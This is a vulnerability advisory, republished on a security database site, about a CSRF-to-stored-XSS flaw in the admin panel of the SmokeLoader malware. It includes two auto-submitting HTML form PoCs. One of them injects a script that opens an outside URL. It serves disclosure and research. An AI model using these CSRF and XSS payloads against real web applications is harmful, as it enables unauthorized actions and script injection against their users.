---
title: Panel.SmokeLoader MVID-2024-0682 Cross Site Request Forgery / Cross Site Scripting
url: https://cxsecurity.com/issue/WLB-2024050054
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-05-20
fetch_date: 2025-10-06T16:48:27.149132
---

# Panel.SmokeLoader MVID-2024-0682 Cross Site Request Forgery / Cross Site Scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Panel.SmokeLoader MVID-2024-0682 Cross Site Request Forgery / Cross Site Scripting** **2024.05.19**  Credit:  **[malvuln](https://cxsecurity.com/author/malvuln/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")  [CWE-352](https://cxsecurity.com/cwe/CWE-352 "Click to see CWE-352")** | |

Discovery / credits: Malvuln (John Page aka hyp3rlinx) (c) 2024
Original source: https://malvuln.com/advisory/4b5fc3a2489985f314b81d35eac3560f\_B.txt
Contact: malvuln13@gmail.com
Media: twitter.com/malvuln
Threat: Panel.SmokeLoader
Vulnerability: Cross Site Request Forgery (CSRF) - Persistent XSS
Family: SmokeLoader
Type: Web Panel
MD5: 4b5fc3a2489985f314b81d35eac3560f (control.php)
SHA256: 8d02238577081be74b9ebc1effcfbf3452ffdb51f130398b5ab875b9bfe17743
Vuln ID: MVID-2024-0682
Disclosure: The smokebot admin web panel is written in PHP for remote administration capability.
The panel has multiple features like Bot List, Task List, Stealer, Miner, Email Grab, KeyLogger etc. The "control.php" PHP page contains an HTML FORM using POST method, however there is no CSRF security token used by the FORM. This is a unique token per session within the FORM, used as a challenge to the server to help prevent cross-site-scripting attacks. Therefore, third-party adversaries who can lure a panel user to visit an attacker controlled webpage or click an infected link may result in the panel users submitting FORMS on an attackers behalf. This may result in code execution, data theft, GEO location disclosure. The CSRF to XSS results in stored JS payload in the smoke MySQL database table "plugins".
hash fgfilter fakedns\_rules filesearch\_rules procmon\_rules ddos\_rules keylog\_rules fgcookies miner\_rules
93666df0833e0b63917e5373812613 0 ""/%3E%3Cscript%3Ewindow.open("https://www.malvuln.com/l...
Exploit/PoC:
1) CSRF to add your own Miner Pool
%3Cform method="post" action="http://127.0.0.1/Panel.SmokeLoader/SmokeLoader/Smoke/control1.php?page=miner"%3E
Pool: %3Cinput type="input" name="miner\_pool" size="30" value="MyPoolFool:666"%3E
Login: %3Cinput type="input" name="miner\_login" size="20" value="gg"%3E
Password: %3Cinput type="input" name="miner\_pass" size="20" value="malvuln"%3E
%3Cinput type="hidden" name="mode" value="miner"%3E
%3Cinput type="submit" value="SAVE"%3E
%3Cscript%3Edocument.forms[0].submit()%3C/script%3E
%3C/form%3E
2) CSRF to Persistent XSS
%3Cform method="post" action="http://127.0.0.1/Panel.SmokeLoader/SmokeLoader/Smoke/control1.php?page=miner"%3E
Pool: %3Cinput type="input" name="miner\_pool" size="300" value='""/%3E%3Cscript%3Ewindow.open("https://www.malvuln.com/log.php")%3C/script%3E"'%3E
Login: %3Cinput type="input" name="miner\_login" size="20" value="gg"%3E
Password: %3Cinput type="input" name="miner\_pass" size="20" value="malvuln"%3E
%3Cinput type="hidden" name="mode" value="miner"%3E
%3Cinput type="submit" value="SAVE"%3E
%3Cscript%3Edocument.forms[0].submit()%3C/script%3E
%3C/form%3E
Disclaimer: The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise. Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information or exploits by the author or elsewhere. Do not attempt to download Malware samples. The author of this website takes no responsibility for any kind of damages occurring from improper Malware handling or the downloading of ANY Malware mentioned on this website or elsewhere. All content Copyright (c) Malvuln.com (TM).

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024050054)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top